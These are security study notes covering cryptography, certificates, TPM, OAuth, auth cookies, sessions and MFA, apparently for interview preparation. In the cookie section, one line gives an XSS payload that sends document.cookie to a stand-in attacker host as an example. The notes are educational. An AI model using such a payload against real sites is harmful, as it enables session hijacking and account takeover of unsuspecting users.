# Cryptography, authentication, identity

Encryption vs Encoding vs Hashing vs Obfuscation vs Signing

    Be able to explain the differences between these things.
    Various attack models (e.g. chosen-plaintext attack).

Encryption standards + implementations

    RSA (asymmetrical).
    AES (symmetrical).
    ECC (namely ed25519) (asymmetric).
    Chacha/Salsa (symmetric)
    
Asymmetric vs symmetric

    Asymmetric is slow, but good for establishing a trusted connection.
    Symmetric has a shared key and is faster. Protocols often use asymmetric to transfer symmetric key.
    Perfect forward secrecy - eg Signal uses this.

Ciphers

    Block vs stream ciphers.
    Block cipher modes of operation.
    AES-GCM

Trusted Platform Module

    (TPM)
    Trusted storage for certs and auth data locally on device/host.
    Secure cryptoprocessor designed to secure hardware through integrated cryptographic keys
    Uses:
        Platform integrity
        Disk encryption
        Password Protection
    Different types => Discrete(dedicated chip), Integrated(part of another chip), Firmware, Hypervisor(virtual), Software(emulators)

Integrity and authenticity primitives

    Hashing functions, e.g. MD5, Sha-1, BLAKE. Used for identifiers, very useful for fingerprinting malware samples.
    Message Authentication Codes (MACs).
    Keyed-hash MAC (HMAC).
        - Keyed hash of data
        - Provides collision resistance
    Length-Extension attack - Attacker can use Hash(message1) and the length of message1 to calculate Hash(message1 ‖ message2) for an attacker-controlled message2, without needing to know the content of message1

Entropy

    PRNG (pseudo random number generators).
    Entropy buffer draining.
    Methods of filling entropy buffer.

Certificates

    What info do certs contain, how are they signed?
    Generate CSR request providing following details
        - FQDN of server
        - Legal org name
        - Legal Org unit
        - Address
        - Email
        - Pulic Key of the request generator
        - Info about key-type and length
    CSR == Base-64 encoded PKCS#10
    X.509 v3 digital certificate is as follows :
        Certificate
            Version Number
            Serial Number
            Signature Algorithm ID
            Issuer Name
            Validity period
                Not Before
                Not After
            Subject name
            Subject Public Key Info
                Public Key Algorithm
                Subject Public Key
            Issuer Unique Identifier (optional)
            Subject Unique Identifier (optional)
            Extensions (optional)
                ...
        Certificate Signature Algorithm
        Certificate Signature
    Common file names for X.509
        .pem – (Privacy-enhanced Electronic Mail) Base64 encoded DER certificate
        .cer, .crt, .der – usually in binary DER form, but Base64-encoded certificates are common too
        .p7b, .p7c – PKCS#7 SignedData structure without data, just certificate(s) or CRL(s)
        .p12 – PKCS#12, Cert(s) (public) + private keys (password protected)
        
    Look at DigiNotar
        Large-scale MitM attack against Gmail users in Iran
        Valid wildcard certificate, issued by DigiNotar, for *.google.com
        Other high-value domains, including Yahoo, Mozilla
        All 8 servers that managed CAs were compromised
        DigiNotar had its network highly segmented and many segments were private
        But no strict rules inside its network
    Comodo hack 2011
        https://www.comodo.com/Comodo-Fraud-Incident-2011-03-23.html

O-auth

    Bearer tokens, this can be stolen and used, just like cookies.
    3 Players
        1. End user
        2. API
        3. Resource provider (RP)
    Flow
        - API asks for auth from RP providing user's verified identity
        - After authenticating API, RP provides access token
        - Tokens have scopes defined to access limited information for API
    Vulnerabilities in Client application
        1. Improper implementation of implicit grant type - 
        2. Flawed CSRF implementation
    Vulnerabilities in OAuth service
        1. Leaking authorization codes and access tokens LABS
        2. Flawed scope validation
        3. Unverified user registration

Auth Cookies

    Client side.
    Client side maintain state
        - Local storage : XSS vulnerability [ document.write('<img src="https://yourserver.evil.com/collect.gif?cookie=' + document.cookie + '" />') ]
        - Cookies : CSRF vulnerability
    Session Hijacking - Stealing cookies and impersonating user
    Session fixation - 
        The attacker gets cookie from a web page
        Sends to the victim
        Victim logins using the cookie of the attacker
        If the cookie is not changed when a user logs in
        Attacker could be able to impersonate the user using the cookie
    Session donation
        Attacker sends their session to victim
        Victim adds missing info to the session

Sessions

    Server side.

Auth systems

    SAMLv2o.
    OpenID.

Biometrics

    Can't rotate unlike passwords.

Password management

    Rotating passwords (and why this is bad).
    Different password lockers.

U2F / FIDO

    Eg. Yubikeys.
    Helps prevent successful phishing of credentials.
    Compare and contrast multi-factor auth methods
